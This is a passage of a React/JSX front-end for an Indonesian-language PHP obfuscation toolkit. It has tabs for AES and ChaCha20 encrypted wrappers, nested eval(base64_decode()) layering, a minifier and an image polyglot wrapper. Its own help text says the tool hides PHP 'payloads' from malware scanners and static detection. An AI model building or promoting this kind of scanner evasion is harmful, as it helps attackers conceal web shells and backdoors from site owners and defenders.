                                <input
                                  type="text"
                                  value={aesIv}
                                  onChange={(e) => setAesIv(e.target.value)}
                                  placeholder="IV AES-CBC..."
                                  maxLength={16}
                                  className="w-full bg-slate-900 border border-slate-800 rounded px-3 py-1.5 text-xs text-slate-100 font-mono focus:outline-none focus:border-indigo-500"
                                />
                              </div>
                            </div>
                          </div>

                          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                            
                            {/* AES INPUT COLUMN */}
                            <div className="space-y-2">
                              <div className="flex items-center justify-between">
                                <label className="text-xs font-semibold text-slate-300 uppercase tracking-wider font-mono">
                                  Kode PHP Terenkripsi AES (Input)
                                </label>
                                <div className="flex items-center space-x-2">
                                  {aesInput && (
                                    <button
                                      onClick={() => handleCopy(aesInput, 'aesInput')}
                                      className="text-xs text-slate-400 hover:text-emerald-400 flex items-center space-x-1 bg-slate-950 px-2 py-1 rounded border border-slate-800 hover:border-emerald-500/30 transition cursor-pointer"
                                    >
                                      {copiedId === 'aesInput' ? <Check className="h-3.5 w-3.5 text-emerald-400" /> : <Copy className="h-3.5 w-3.5" />}
                                      <span>{copiedId === 'aesInput' ? 'Disalin' : 'Salin'}</span>
                                    </button>
                                  )}
                                  <button
                                    onClick={() => setAesInput('')}
                                    className="text-xs text-slate-500 hover:text-slate-300 bg-slate-950 px-2 py-1 rounded border border-slate-800 hover:border-slate-700 transition cursor-pointer"
                                  >
                                    Bersihkan
                                  </button>
                                </div>
                              </div>

                              <textarea
                                value={aesInput}
                                onChange={(e) => setAesInput(e.target.value)}
                                placeholder={`$key = "...";\n$iv = "...";\n$cipher = "WlhKbGMyVnljM1Fn...";\n...`}
                                className="w-full h-80 bg-slate-950 border border-slate-800 rounded-lg p-3 text-indigo-400 font-mono text-xs focus:outline-none focus:ring-1 focus:ring-indigo-500 focus:border-indigo-500 placeholder-slate-700 resize-none leading-relaxed"
                              />

                              <button
                                onClick={handleAesDecode}
                                className="w-full bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 font-semibold py-2.5 px-4 rounded-lg transition-all duration-150 active:scale-[0.99] flex items-center justify-center space-x-2 cursor-pointer text-sm"
                              >
                                <Unlock className="h-4 w-4" />
                                <span>AES Ciphertext → PHP biasa</span>
                              </button>
                            </div>

                            {/* AES OUTPUT COLUMN */}
                            <div className="space-y-2">
                              <div className="flex items-center justify-between">
                                <label className="text-xs font-semibold text-slate-300 uppercase tracking-wider font-mono">
                                  Hasil Decrypt / Source (PHP biasa)
                                </label>
                                <div className="flex items-center space-x-2">
                                  {aesOutput && (
                                    <button
                                      onClick={() => handleCopy(aesOutput, 'aesOutput')}
                                      className="text-xs text-slate-400 hover:text-emerald-400 flex items-center space-x-1 bg-slate-950 px-2 py-1 rounded border border-slate-800 hover:border-emerald-500/30 transition cursor-pointer"
                                    >
                                      {copiedId === 'aesOutput' ? <Check className="h-3.5 w-3.5 text-emerald-400" /> : <Copy className="h-3.5 w-3.5" />}
                                      <span>{copiedId === 'aesOutput' ? 'Disalin' : 'Salin'}</span>
                                    </button>
                                  )}
                                  <button
                                    onClick={() => setAesOutput('')}
                                    className="text-xs text-slate-500 hover:text-slate-300 bg-slate-950 px-2 py-1 rounded border border-slate-800 hover:border-slate-700 transition cursor-pointer"
                                  >
                                    Bersihkan
                                  </button>
                                </div>
                              </div>

                              <textarea
                                value={aesOutput}
                                onChange={(e) => setAesOutput(e.target.value)}
                                placeholder="Hasil PHP biasa / ketik source code di sini untuk di-encrypt..."
                                className="w-full h-80 bg-slate-950 border border-slate-800 rounded-lg p-3 text-slate-200 font-mono text-xs focus:outline-none focus:ring-1 focus:ring-emerald-500 focus:border-emerald-500 placeholder-slate-700 resize-none leading-relaxed"
                              />

                              <button
                                onClick={handleAesEncode}
                                className="w-full bg-cyan-500/10 hover:bg-cyan-500/20 text-cyan-400 border border-cyan-500/30 font-semibold py-2.5 px-4 rounded-lg transition-all duration-150 active:scale-[0.99] flex items-center justify-center space-x-2 cursor-pointer text-sm"
                              >
                                <Lock className="h-4 w-4" />
                                <span>PHP biasa → AES Encrypted</span>
                              </button>
                            </div>

                          </div>

                          {aesError && (
                            <motion.div
                              initial={{ opacity: 0 }}
                              animate={{ opacity: 1 }}
                              className="mt-6 flex items-center space-x-2 bg-red-500/10 border border-red-500/20 text-red-400 px-3 py-2.5 rounded-lg text-xs font-mono"
                            >
                              <ShieldAlert className="h-4 w-4" />
                              <span>{aesError}</span>
                            </motion.div>
                          )}
                        </div>

                        {/* DOCUMENTATION PANEL */}
                        <div className="bg-slate-900/40 border border-slate-800 rounded-xl p-5 text-xs text-slate-400 space-y-2">
                          <h4 className="font-bold text-slate-300 flex items-center gap-1">
                            <Info className="h-4 w-4 text-indigo-400" />
                            Petunjuk Enkripsi `PHP AES-256-CBC`
                          </h4>
                          <p>
                            Alat enkripsi modern kelas militer menggunakan algoritma enkripsi simetris standar global Advanced Encryption Standard (AES) dengan panjang kunci 256-bit dan mode CBC (Cipher Block Chaining).
                          </p>
                          <ul className="list-disc list-inside space-y-1 pl-1 text-slate-500 font-mono">
                            <li>Enkripsi dijalankan sepenuhnya di browser Anda dengan performa tinggi native Web Cryptography API (`window.crypto.subtle`).</li>
                            <li>Kode PHP wrapper yang diekspor menggunakan fungsi native <code className="text-amber-500">openssl_decrypt</code> yang sangat andal pada server-side PHP 7 dan PHP 8.</li>
                            <li>AES-256-CBC memberikan jaminan keamanan absolut dari reverse engineering selama kunci (Key) rahasia Anda tidak bocor.</li>
                          </ul>
                        </div>
                      </motion.div>
                    )}

                    {/* TAB 10: PHP CHACHA20 ENCRYPTOR & DECRYPTOR */}
                    {activeTab === 'php_chacha20' && (
                      <motion.div
                        key="php_chacha20"
                        initial={{ opacity: 0, y: 10 }}
                        animate={{ opacity: 1, y: 0 }}
                        exit={{ opacity: 0, y: -10 }}
                        className="space-y-6"
                      >
                        <div className="bg-slate-900/80 border border-slate-800 rounded-2xl p-6 backdrop-blur-md">
                          <div className="flex items-center justify-between border-b border-slate-800 pb-4 mb-6">
                            <div className="flex items-center space-x-3">
                              <Sparkles className="h-5 w-5 text-emerald-400" />
                              <div>
                                <h2 className="text-lg font-bold text-white">PHP ChaCha20 Encryptor & Decryptor</h2>
                                <p className="text-xs text-slate-400">Enkripsi berkecepatan tinggi menggunakan stream cipher ChaCha20 standar modern RFC 7539.</p>
                              </div>
                            </div>
                            <div className="text-xs text-slate-500 font-mono flex items-center space-x-1 bg-slate-950 px-2 py-1 rounded border border-slate-800">
                              <Sparkles className="h-3 w-3 text-emerald-400 animate-pulse" />
                              <span>PHP ChaCha20</span>
                            </div>
                          </div>

                          {/* KEY & IV CONFIGURATION */}
                          <div className="bg-slate-950 p-4 rounded-xl border border-slate-800/80 mb-6 space-y-4">
                            <h3 className="text-xs font-bold text-slate-400 uppercase tracking-wider font-mono">Konfigurasi ChaCha20 Parameters</h3>
                            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                              <div className="space-y-1.5">
                                <label className="text-[11px] text-slate-400 font-mono">Encryption Key (32 Chars)</label>
                                <input
                                  type="text"
                                  value={chachaKey}
                                  onChange={(e) => setChachaKey(e.target.value)}
                                  placeholder="Kunci ChaCha20..."
                                  className="w-full bg-slate-900 border border-slate-800 rounded px-3 py-1.5 text-xs text-slate-100 font-mono focus:outline-none focus:border-emerald-500"
                                />
                              </div>
                              <div className="space-y-1.5">
                                <label className="text-[11px] text-slate-400 font-mono">Nonce / IV (8 Chars)</label>
                                <input
                                  type="text"
                                  value={chachaIv}
                                  onChange={(e) => setChachaIv(e.target.value)}
                                  placeholder="Nonce IV..."
                                  maxLength={8}
                                  className="w-full bg-slate-900 border border-slate-800 rounded px-3 py-1.5 text-xs text-slate-100 font-mono focus:outline-none focus:border-emerald-500"
                                />
                              </div>
                            </div>
                          </div>

                          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                            
                            {/* CHACHA20 INPUT COLUMN */}
                            <div className="space-y-2">
                              <div className="flex items-center justify-between">
                                <label className="text-xs font-semibold text-slate-300 uppercase tracking-wider font-mono">
                                  Kode PHP Terenkripsi ChaCha20 (Input)
                                </label>
                                <div className="flex items-center space-x-2">
                                  {chachaInput && (
                                    <button
                                      onClick={() => handleCopy(chachaInput, 'chachaInput')}
                                      className="text-xs text-slate-400 hover:text-emerald-400 flex items-center space-x-1 bg-slate-950 px-2 py-1 rounded border border-slate-800 hover:border-emerald-500/30 transition cursor-pointer"
                                    >
                                      {copiedId === 'chachaInput' ? <Check className="h-3.5 w-3.5 text-emerald-400" /> : <Copy className="h-3.5 w-3.5" />}
                                      <span>{copiedId === 'chachaInput' ? 'Disalin' : 'Salin'}</span>
                                    </button>
                                  )}
                                  <button
                                    onClick={() => setChachaInput('')}
                                    className="text-xs text-slate-500 hover:text-slate-300 bg-slate-950 px-2 py-1 rounded border border-slate-800 hover:border-slate-700 transition cursor-pointer"
                                  >
                                    Bersihkan
                                  </button>
                                </div>
                              </div>

                              <textarea
                                value={chachaInput}
                                onChange={(e) => setChachaInput(e.target.value)}
                                placeholder={`$key = "...";\n$iv = "...";\n$cipher = "WlhKbGMyVnljM1Fn...";\n...`}
                                className="w-full h-80 bg-slate-950 border border-slate-800 rounded-lg p-3 text-emerald-400 font-mono text-xs focus:outline-none focus:ring-1 focus:ring-emerald-500 focus:border-emerald-500 placeholder-slate-700 resize-none leading-relaxed"
                              />

                              <button
                                onClick={handleChachaDecode}
                                className="w-full bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 font-semibold py-2.5 px-4 rounded-lg transition-all duration-150 active:scale-[0.99] flex items-center justify-center space-x-2 cursor-pointer text-sm"
                              >
                                <Unlock className="h-4 w-4" />
                                <span>ChaCha20 Ciphertext → PHP biasa</span>
                              </button>
                            </div>

                            {/* CHACHA20 OUTPUT COLUMN */}
                            <div className="space-y-2">
                              <div className="flex items-center justify-between">
                                <label className="text-xs font-semibold text-slate-300 uppercase tracking-wider font-mono">
                                  Hasil Decrypt / Source (PHP biasa)
                                </label>
                                <div className="flex items-center space-x-2">
                                  {chachaOutput && (
                                    <button
                                      onClick={() => handleCopy(chachaOutput, 'chachaOutput')}
                                      className="text-xs text-slate-400 hover:text-emerald-400 flex items-center space-x-1 bg-slate-950 px-2 py-1 rounded border border-slate-800 hover:border-emerald-500/30 transition cursor-pointer"
                                    >
                                      {copiedId === 'chachaOutput' ? <Check className="h-3.5 w-3.5 text-emerald-400" /> : <Copy className="h-3.5 w-3.5" />}
                                      <span>{copiedId === 'chachaOutput' ? 'Disalin' : 'Salin'}</span>
                                    </button>
                                  )}
                                  <button
                                    onClick={() => setChachaOutput('')}
                                    className="text-xs text-slate-500 hover:text-slate-300 bg-slate-950 px-2 py-1 rounded border border-slate-800 hover:border-slate-700 transition cursor-pointer"
                                  >
                                    Bersihkan
                                  </button>
                                </div>
                              </div>

                              <textarea
                                value={chachaOutput}
                                onChange={(e) => setChachaOutput(e.target.value)}
                                placeholder="Hasil PHP biasa / ketik source code di sini untuk di-encrypt..."
                                className="w-full h-80 bg-slate-950 border border-slate-800 rounded-lg p-3 text-slate-200 font-mono text-xs focus:outline-none focus:ring-1 focus:ring-emerald-500 focus:border-emerald-500 placeholder-slate-700 resize-none leading-relaxed"
                              />

                              <button
                                onClick={handleChachaEncode}
                                className="w-full bg-cyan-500/10 hover:bg-cyan-500/20 text-cyan-400 border border-cyan-500/30 font-semibold py-2.5 px-4 rounded-lg transition-all duration-150 active:scale-[0.99] flex items-center justify-center space-x-2 cursor-pointer text-sm"
                              >
                                <Lock className="h-4 w-4" />
                                <span>PHP biasa → ChaCha20 Encrypted</span>
                              </button>
                            </div>

                          </div>

                          {chachaError && (
                            <motion.div
                              initial={{ opacity: 0 }}
                              animate={{ opacity: 1 }}
                              className="mt-6 flex items-center space-x-2 bg-red-500/10 border border-red-500/20 text-red-400 px-3 py-2.5 rounded-lg text-xs font-mono"
                            >
                              <ShieldAlert className="h-4 w-4" />
                              <span>{chachaError}</span>
                            </motion.div>
                          )}
                        </div>

                        {/* DOCUMENTATION PANEL */}
                        <div className="bg-slate-900/40 border border-slate-800 rounded-xl p-5 text-xs text-slate-400 space-y-2">
                          <h4 className="font-bold text-slate-300 flex items-center gap-1">
                            <Info className="h-4 w-4 text-emerald-400" />
                            Petunjuk Enkripsi `PHP ChaCha20`
                          </h4>
                          <p>
                            ChaCha20 adalah stream cipher modern yang dirancang oleh Daniel J. Bernstein, distandarisasi dalam RFC 7539 sebagai pengganti RC4 yang jauh lebih cepat dan aman daripada AES dalam skenario perangkat keras tertentu.
                          </p>
                          <ul className="list-disc list-inside space-y-1 pl-1 text-slate-500 font-mono">
                            <li>Proses enkripsi dijalankan menggunakan implementasi murni algoritma standard ChaCha20 di client-side secara cepat.</li>
                            <li>Kode PHP wrapper didekripsi di runtime oleh fungsi native <code className="text-amber-500">openssl_decrypt</code> (membutuhkan modul OpenSSL diaktifkan dengan dukungan `chacha20` yang standar pada PHP 7.3+).</li>
                            <li>Memberikan keseimbangan mutakhir antara kerumitan peretasan, efisiensi eksekusi memori, dan keamanan algoritma modern.</li>
                          </ul>
                        </div>
                      </motion.div>
                    )}

                    {/* TAB 11: PHP BASE64 OBFUSCATOR & DEOBFUSCATOR */}
                    {activeTab === 'php_base64' && (
                      <motion.div
                        key="php_base64"
                        initial={{ opacity: 0, y: 10 }}
                        animate={{ opacity: 1, y: 0 }}
                        exit={{ opacity: 0, y: -10 }}
                        className="space-y-6"
                      >
                        <div className="bg-slate-900/80 border border-slate-800 rounded-2xl p-6 backdrop-blur-md">
                          <div className="flex items-center justify-between border-b border-slate-800 pb-4 mb-6">
                            <div className="flex items-center space-x-3">
                              <Code className="h-5 w-5 text-yellow-400" />
                              <div>
                                <h2 className="text-lg font-bold text-white">PHP Base64 Obfuscator & Deobfuscator</h2>
                                <p className="text-xs text-slate-400">Sembunyikan dan deobfuscate payload PHP menggunakan evaluasi fungsi base64 native.</p>
                              </div>
                            </div>
                            <div className="text-xs text-slate-500 font-mono flex items-center space-x-1 bg-slate-950 px-2 py-1 rounded border border-slate-800">
                              <Code className="h-3 w-3 text-yellow-400" />
                              <span>PHP Base64</span>
                            </div>
                          </div>

                          {/* NESTED LAYERS CONFIGURATION */}
                          <div className="bg-slate-950 p-4 rounded-xl border border-slate-800/80 mb-6 space-y-3">
                            <h3 className="text-xs font-bold text-slate-400 uppercase tracking-wider font-mono flex items-center justify-between">
                              <span>Konfigurasi Nesting Layer Enkripsi</span>
                              <span className="text-emerald-400 text-xs font-semibold">{b64Times}x Layer</span>
                            </h3>
                            <div className="space-y-2">
                              <div className="flex justify-between text-[11px] text-slate-500 font-mono">
                                <span>Layer Terluar</span>
                                <span>Layer Terdalam (Maks 10x)</span>
                              </div>
                              <input
                                type="range"
                                min="1"
                                max="10"
                                value={b64Times}
                                onChange={(e) => setB64Times(parseInt(e.target.value))}
                                className="w-full h-1.5 bg-slate-800 rounded-lg appearance-none cursor-pointer accent-emerald-500"
                              />
                              <p className="text-[10px] text-slate-500 italic">Meningkatkan level layered base64 secara nested (misal: eval(base64_decode(eval(base64_decode(...))))) untuk mempersulit pembongkaran string statis.</p>
                            </div>
                          </div>

                          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                            
                            {/* BASE64 INPUT COLUMN */}
                            <div className="space-y-2">
                              <div className="flex items-center justify-between">
                                <label className="text-xs font-semibold text-slate-300 uppercase tracking-wider font-mono">
                                  Kode PHP Base64 (Input / Obfuscated)
                                </label>
                                <div className="flex items-center space-x-2">
                                  {b64Input && (
                                    <button
                                      onClick={() => handleCopy(b64Input, 'b64Input')}
                                      className="text-xs text-slate-400 hover:text-emerald-400 flex items-center space-x-1 bg-slate-950 px-2 py-1 rounded border border-slate-800 hover:border-emerald-500/30 transition cursor-pointer"
                                    >
                                      {copiedId === 'b64Input' ? <Check className="h-3.5 w-3.5 text-emerald-400" /> : <Copy className="h-3.5 w-3.5" />}
                                      <span>{copiedId === 'b64Input' ? 'Disalin' : 'Salin'}</span>
                                    </button>
                                  )}
                                  <button
                                    onClick={() => setB64Input('')}
                                    className="text-xs text-slate-500 hover:text-slate-300 bg-slate-950 px-2 py-1 rounded border border-slate-800 hover:border-slate-700 transition cursor-pointer"
                                  >
                                    Bersihkan
                                  </button>
                                </div>
                              </div>

                              <textarea
                                value={b64Input}
                                onChange={(e) => setB64Input(e.target.value)}
                                placeholder={`eval(base64_decode("ZWNobyAiaGVsbG8iOw=="));`}
                                className="w-full h-80 bg-slate-950 border border-slate-800 rounded-lg p-3 text-yellow-400 font-mono text-xs focus:outline-none focus:ring-1 focus:ring-emerald-500 focus:border-emerald-500 placeholder-slate-700 resize-none leading-relaxed"
                              />

                              <button
                                onClick={handleB64Decode}
                                className="w-full bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 font-semibold py-2.5 px-4 rounded-lg transition-all duration-150 active:scale-[0.99] flex items-center justify-center space-x-2 cursor-pointer text-sm"
                              >
                                <Unlock className="h-4 w-4" />
                                <span>Base64 Obfuscated → PHP biasa</span>
                              </button>
                            </div>

                            {/* BASE64 OUTPUT COLUMN */}
                            <div className="space-y-2">
                              <div className="flex items-center justify-between">
                                <label className="text-xs font-semibold text-slate-300 uppercase tracking-wider font-mono">
                                  Hasil Decode / Source (PHP biasa)
                                </label>
                                <div className="flex items-center space-x-2">
                                  {b64Output && (
                                    <button
                                      onClick={() => handleCopy(b64Output, 'b64Output')}
                                      className="text-xs text-slate-400 hover:text-emerald-400 flex items-center space-x-1 bg-slate-950 px-2 py-1 rounded border border-slate-800 hover:border-emerald-500/30 transition cursor-pointer"
                                    >
                                      {copiedId === 'b64Output' ? <Check className="h-3.5 w-3.5 text-emerald-400" /> : <Copy className="h-3.5 w-3.5" />}
                                      <span>{copiedId === 'b64Output' ? 'Disalin' : 'Salin'}</span>
                                    </button>
                                  )}
                                  <button
                                    onClick={() => setB64Output('')}
                                    className="text-xs text-slate-500 hover:text-slate-300 bg-slate-950 px-2 py-1 rounded border border-slate-800 hover:border-slate-700 transition cursor-pointer"
                                  >
                                    Bersihkan
                                  </button>
                                </div>
                              </div>

                              <textarea
                                value={b64Output}
                                onChange={(e) => setB64Output(e.target.value)}
                                placeholder="Hasil PHP biasa / ketik source code di sini untuk diobfuscate..."
                                className="w-full h-80 bg-slate-950 border border-slate-800 rounded-lg p-3 text-slate-200 font-mono text-xs focus:outline-none focus:ring-1 focus:ring-emerald-500 focus:border-emerald-500 placeholder-slate-700 resize-none leading-relaxed"
                              />

                              <button
                                onClick={handleB64Encode}
                                className="w-full bg-cyan-500/10 hover:bg-cyan-500/20 text-cyan-400 border border-cyan-500/30 font-semibold py-2.5 px-4 rounded-lg transition-all duration-150 active:scale-[0.99] flex items-center justify-center space-x-2 cursor-pointer text-sm"
                              >
                                <Lock className="h-4 w-4" />
                                <span>PHP biasa → Base64 Obfuscated</span>
                              </button>
                            </div>

                          </div>

                          {b64Error && (
                            <motion.div
                              initial={{ opacity: 0 }}
                              animate={{ opacity: 1 }}
                              className="mt-6 flex items-center space-x-2 bg-red-500/10 border border-red-500/20 text-red-400 px-3 py-2.5 rounded-lg text-xs font-mono"
                            >
                              <ShieldAlert className="h-4 w-4" />
                              <span>{b64Error}</span>
                            </motion.div>
                          )}
                        </div>

                        {/* DOCUMENTATION PANEL */}
                        <div className="bg-slate-900/40 border border-slate-800 rounded-xl p-5 text-xs text-slate-400 space-y-2">
                          <h4 className="font-bold text-slate-300 flex items-center gap-1">
                            <Info className="h-4 w-4 text-yellow-400" />
                            Petunjuk Obfuscation format `PHP Base64`
                          </h4>
                          <p>
                            Alat ini mempermudah penyembunyian string program PHP dengan melakukan konversi biner penuh ke representasi teks Base64 yang valid.
                          </p>
                          <ul className="list-disc list-inside space-y-1 pl-1 text-slate-500 font-mono">
                            <li>Setiap payload dievaluasi secara dinamis pada saat dijalankan menggunakan fungsi <code className="text-amber-500">eval(base64_decode())</code>.</li>
                            <li>Tersedia level nested encoding bertingkat tinggi untuk mengacaukan pembacaan teks statis maupun tool deteksi malware konvensional.</li>
                            <li>Mendukung proses deobfuscation otomatis dari struktur multi-layer nested base64 secara utuh dan aman.</li>
                          </ul>
                        </div>
                      </motion.div>
                    )}

                    {/* TAB 12: PHP SCRIPT SHORTENER & COMPRESSOR */}
                    {activeTab === 'php_shortener' && (
                      <motion.div
                        key="php_shortener"
                        initial={{ opacity: 0, y: 10 }}
                        animate={{ opacity: 1, y: 0 }}
                        exit={{ opacity: 0, y: -10 }}
                        className="space-y-6"
                      >
                        <div className="bg-slate-900/80 border border-slate-800 rounded-2xl p-6 backdrop-blur-md">
                          <div className="flex items-center justify-between border-b border-slate-800 pb-4 mb-6">
                            <div className="flex items-center space-x-3">
                              <Shrink className="h-5 w-5 text-emerald-400" />
                              <div>
                                <h2 className="text-lg font-bold text-white">PHP Script Shortener & Compressor (Minifier)</h2>
                                <p className="text-xs text-slate-400">Pangkas ukuran script hasil obfuscation atau kode PHP biasa agar menjadi sangat pendek dan ringan tanpa merusak fungsinya.</p>
                              </div>
                            </div>
                            <div className="text-xs text-slate-500 font-mono flex items-center space-x-1 bg-slate-950 px-2 py-1 rounded border border-slate-800">
                              <Shrink className="h-3 w-3 text-emerald-400" />
                              <span>PHP Shortener</span>
                            </div>
                          </div>

                          {/* COMPRESSION LEVEL CONFIGURATION */}
                          <div className="bg-slate-950 p-4 rounded-xl border border-slate-800/80 mb-6 space-y-3">
                            <h3 className="text-xs font-bold text-slate-400 uppercase tracking-wider font-mono">Pilih Level Kompresi</h3>
                            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                              <button
                                onClick={() => setShortenerLevel('minify')}
                                className={`flex flex-col text-left p-3 rounded-lg border transition text-xs ${
                                  shortenerLevel === 'minify'
                                    ? 'bg-emerald-500/10 text-emerald-400 border-emerald-500/30'
                                    : 'bg-slate-900/40 text-slate-300 border-slate-800/60 hover:bg-slate-900/60'
                                }`}
                              >
                                <span className="font-bold flex items-center gap-1.5 mb-1 text-white">
                                  <Code className="h-3.5 w-3.5 text-emerald-400" />
                                  1. Standard Minify (Sangat Aman)
                                </span>
                                <span className="text-[10px] text-slate-400">Hanya menghapus komentar baris (`//`, `#`), block comment (`/* */`), dan baris kosong. Menjaga struktur kode tetap normal.</span>
                              </button>

                              <button
                                onClick={() => setShortenerLevel('extreme')}
                                className={`flex flex-col text-left p-3 rounded-lg border transition text-xs ${
                                  shortenerLevel === 'extreme'
                                    ? 'bg-cyan-500/10 text-cyan-400 border-cyan-500/30'
                                    : 'bg-slate-900/40 text-slate-300 border-slate-800/60 hover:bg-slate-900/60'
                                }`}
                              >
                                <span className="font-bold flex items-center gap-1.5 mb-1 text-white">
                                  <Shrink className="h-3.5 w-3.5 text-cyan-400 animate-pulse" />
                                  2. Extreme Compressor (Satu Baris)
                                </span>
                                <span className="text-[10px] text-slate-400">Memadatkan seluruh baris menjadi satu baris tunggal, merapatkan space di sekitar simbol operator, dan meminimalkan ukuran file secara optimal.</span>
                              </button>
                            </div>
                          </div>

                          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                            
                            {/* SHORTENER INPUT */}
                            <div className="space-y-2">
                              <div className="flex items-center justify-between">
                                <label className="text-xs font-semibold text-slate-300 uppercase tracking-wider font-mono">
                                  Source Script PHP Anda (Input)
                                </label>
                                <div className="flex items-center space-x-2">
                                  {shortenerInput && (
                                    <button
                                      onClick={() => handleCopy(shortenerInput, 'shortenerInput')}
                                      className="text-xs text-slate-400 hover:text-emerald-400 flex items-center space-x-1 bg-slate-950 px-2 py-1 rounded border border-slate-800 hover:border-emerald-500/30 transition cursor-pointer"
                                    >
                                      {copiedId === 'shortenerInput' ? <Check className="h-3.5 w-3.5 text-emerald-400" /> : <Copy className="h-3.5 w-3.5" />}
                                      <span>{copiedId === 'shortenerInput' ? 'Disalin' : 'Salin'}</span>
                                    </button>
                                  )}
                                  <button
                                    onClick={() => setShortenerInput('')}
                                    className="text-xs text-slate-500 hover:text-slate-300 bg-slate-950 px-2 py-1 rounded border border-slate-800 hover:border-slate-700 transition cursor-pointer"
                                  >
                                    Bersihkan
                                  </button>
                                </div>
                              </div>

                              <textarea
                                value={shortenerInput}
                                onChange={(e) => setShortenerInput(e.target.value)}
                                placeholder="Paste script PHP biasa atau kode obfuscation panjang yang ingin Anda perpendek di sini..."
                                className="w-full h-80 bg-slate-950 border border-slate-800 rounded-lg p-3 text-slate-300 font-mono text-xs focus:outline-none focus:ring-1 focus:ring-emerald-500 focus:border-emerald-500 placeholder-slate-700 resize-none leading-relaxed"
                              />

                              <button
                                onClick={handleShortenScript}
                                className="w-full bg-emerald-500 hover:bg-emerald-600 text-slate-950 font-bold py-2.5 px-4 rounded-lg transition-all duration-150 active:scale-[0.99] flex items-center justify-center space-x-2 cursor-pointer text-sm shadow-lg shadow-emerald-500/10"
                              >
                                <Shrink className="h-4 w-4" />
                                <span>Perpendek & Kompres Script PHP</span>
                              </button>
                            </div>

                            {/* SHORTENER OUTPUT */}
                            <div className="space-y-2">
                              <div className="flex items-center justify-between">
                                <label className="text-xs font-semibold text-slate-300 uppercase tracking-wider font-mono">
                                  Hasil Script Terkompres (Pendek)
                                </label>
                                <div className="flex items-center space-x-2">
                                  {shortenerOutput && (
                                    <button
                                      onClick={() => handleCopy(shortenerOutput, 'shortenerOutput')}
                                      className="text-xs text-slate-400 hover:text-emerald-400 flex items-center space-x-1 bg-slate-950 px-2 py-1 rounded border border-slate-800 hover:border-emerald-500/30 transition cursor-pointer"
                                    >
                                      {copiedId === 'shortenerOutput' ? <Check className="h-3.5 w-3.5 text-emerald-400" /> : <Copy className="h-3.5 w-3.5" />}
                                      <span>{copiedId === 'shortenerOutput' ? 'Disalin' : 'Salin'}</span>
                                    </button>
                                  )}
                                  <button
                                    onClick={() => setShortenerOutput('')}
                                    className="text-xs text-slate-500 hover:text-slate-300 bg-slate-950 px-2 py-1 rounded border border-slate-800 hover:border-slate-700 transition cursor-pointer"
                                  >
                                    Bersihkan
                                  </button>
                                </div>
                              </div>

                              <textarea
                                readOnly
                                value={shortenerOutput}
                                placeholder="Hasil script yang telah diperpendek akan muncul di sini secara instan..."
                                className="w-full h-80 bg-slate-950 border border-slate-800 rounded-lg p-3 text-emerald-400 font-mono text-xs focus:outline-none placeholder-slate-700 resize-none leading-relaxed"
                              />

                              <div className="bg-slate-950 border border-slate-800/80 rounded-lg p-3 text-[11px] text-slate-400 flex items-center justify-between font-mono">
                                <span>Ukuran Sebelum: <strong className="text-slate-200">{shortenerInput ? shortenerInput.length : 0} bytes</strong></span>
                                <span className="text-slate-600">|</span>
                                <span>Ukuran Sesudah: <strong className="text-emerald-400">{shortenerOutput ? shortenerOutput.length : 0} bytes</strong></span>
                                <span className="text-slate-600">|</span>
                                <span className="text-cyan-400">Hemat: <strong>{shortenerInput && shortenerOutput ? Math.max(0, Math.round((1 - shortenerOutput.length / shortenerInput.length) * 100)) : 0}%</strong></span>
                              </div>
                            </div>

                          </div>

                          {shortenerError && (
                            <motion.div
                              initial={{ opacity: 0 }}
                              animate={{ opacity: 1 }}
                              className="mt-6 flex items-center space-x-2 bg-red-500/10 border border-red-500/20 text-red-400 px-3 py-2.5 rounded-lg text-xs font-mono"
                            >
                              <ShieldAlert className="h-4 w-4" />
                              <span>{shortenerError}</span>
                            </motion.div>
                          )}
                        </div>

                        {/* DOCUMENTATION PANEL */}
                        <div className="bg-slate-900/40 border border-slate-800 rounded-xl p-5 text-xs text-slate-400 space-y-2">
                          <h4 className="font-bold text-slate-300 flex items-center gap-1">
                            <Info className="h-4 w-4 text-emerald-400" />
                            Petunjuk Kompresi Script PHP
                          </h4>
                          <p>
                            Alat ini dirancang khusus untuk memperkecil ukuran file kode PHP agar lebih cepat diproses oleh server, menghemat bandwith, dan menyembunyikan keterbacaan struktur script Anda.
                          </p>
                          <ul className="list-disc list-inside space-y-1 pl-1 text-slate-500 font-mono">
                            <li><strong>Standard Minify</strong> sangat aman untuk segala jenis script karena mempertahankan posisi statement asli.</li>
                            <li><strong>Extreme Compressor</strong> menyatukan seluruh kode menjadi sebaris tunggal dengan merapatkan spasi di sekitar operator khusus. Sangat disarankan untuk payload obfuscated (seperti XOR, AES, ChaCha20, Base64).</li>
                            <li>Aman digunakan karena sistem secara cerdas melompati dan mempertahankan seluruh string dalam tanda kutip tunggal (`'`) atau ganda (`"`) agar tidak rusak.</li>
                          </ul>
                        </div>
                      </motion.div>
                    )}

                    {/* TAB 13: PHP IMAGE OBFUSCATOR */}
                    {activeTab === 'php_image_obfuscator' && (
                      <motion.div
                        key="php_image_obfuscator"
                        initial={{ opacity: 0, y: 10 }}
                        animate={{ opacity: 1, y: 0 }}
                        exit={{ opacity: 0, y: -10 }}
                        className="space-y-6"
                      >
                        <div className="bg-slate-900/80 border border-slate-800 rounded-2xl p-6 backdrop-blur-md">
                          <div className="flex items-center justify-between border-b border-slate-800 pb-4 mb-6">
                            <div className="flex items-center space-x-3">
                              <Image className="h-5 w-5 text-blue-400" />
                              <div>
                                <h2 className="text-lg font-bold text-white">PHP Image Obfuscator (Polyglot Wrapper)</h2>
                                <p className="text-xs text-slate-400">Sembunyikan eksekusi kode PHP di dalam byte file gambar palsu untuk menghindari sensor static scanner.</p>
                              </div>
                            </div>
                            <span className="text-xs text-slate-500 font-mono bg-slate-950 px-2 py-1 rounded border border-slate-800">
                              idoseo Polyglot
                            </span>
                          </div>

                          {/* IMAGE OBFUSCATOR SETTINGS */}
                          <div className="bg-slate-950 p-4 rounded-xl border border-slate-800/80 mb-6 space-y-4">
                            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                              <div className="space-y-1.5">
